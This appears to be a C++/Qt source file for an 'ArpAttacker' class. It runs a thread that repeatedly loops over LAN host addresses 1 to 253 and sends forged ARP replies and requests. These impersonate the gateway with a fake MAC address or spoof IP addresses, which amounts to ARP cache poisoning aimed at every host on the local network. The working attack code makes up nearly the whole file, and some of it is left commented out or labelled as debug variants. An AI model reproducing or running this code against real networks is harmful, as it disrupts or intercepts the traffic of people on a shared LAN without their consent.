#include "arpattacker.h"
#include <QDebug>
#include "LANAttacker/lanpcap.h"



void ArpAttacker::StartAttack()
{
    if(this->isRunning())
    {
        qDebug()<<"Thread is already in running";
        return;
    }

    this->start();
}

void ArpAttacker::run()
{
    while(!isInterruptionRequested())
    {


        for(unsigned char Index=1;Index<=253;++Index)
        {
                if(_LANPcap && Index!=_LANPcap->GetCurrentInterfaceLANIndex())
                {

                    this->SendArpAttackPacketDebug(Index);
                    this->SendArpAttackPacketDebug3(Index);
                }

        }

       //   this->SendArpAttackPacketDebug3(193);
    }
}

void ArpAttacker::SendArpAttackPacket(unsigned char LANIndex)
{
    if(_LANPcap)
    {

        LANHostInfo DstHost=_LANPcap->GetHostInfo(LANIndex);

        LANHostInfo SrcHost=_LANPcap->GetHostInfo(254);
       // for(int i=0;i<6;++i)SrcHost.MacAddr[i]=0x66;


     //  _LANPcap->SendArpPacket(SrcHost,DstHost);
    //   _LANPcap->SendArpPacket(DstHost,SrcHost);





    }
}


void ArpAttacker::SendArpAttackPacketDebug(unsigned char LANIndex)
{
    if(_LANPcap)
    {

        LANHostInfo TargetHost=_LANPcap->GetHostInfo(LANIndex);

        LANHostInfo FakeGateHost=_LANPcap->GetHostInfo(254);
        memset(FakeGateHost.MacAddr,0x66,6);





         _LANPcap->SendArpReplyPacket(TargetHost,FakeGateHost);  //can reach it



    }
}


void ArpAttacker::SendArpAttackPacketDebug2(unsigned char LANIndex)
{
    if(_LANPcap)
    {

        LANHostInfo TargetHost=_LANPcap->GetHostInfo(LANIndex);



        LANHostInfo FakeGateHost=_LANPcap->GetHostInfo(254);
        memset(FakeGateHost.MacAddr,0x66,6);
         memset( TargetHost.Ipv4Addr,0x66,4);
        _LANPcap->SendArpRequestPacket(TargetHost,FakeGateHost);



    }
}


void ArpAttacker::SendArpAttackPacketDebug3(unsigned char LANIndex)
{
    if(_LANPcap)
    {

        LANHostInfo TargetHost=_LANPcap->GetHostInfo(LANIndex);



        LANHostInfo GateHost=_LANPcap->GetHostInfo(254);

         memset( TargetHost.Ipv4Addr,0x66,4);
        _LANPcap->SendArpRequestPacket(TargetHost,GateHost);



    }
}
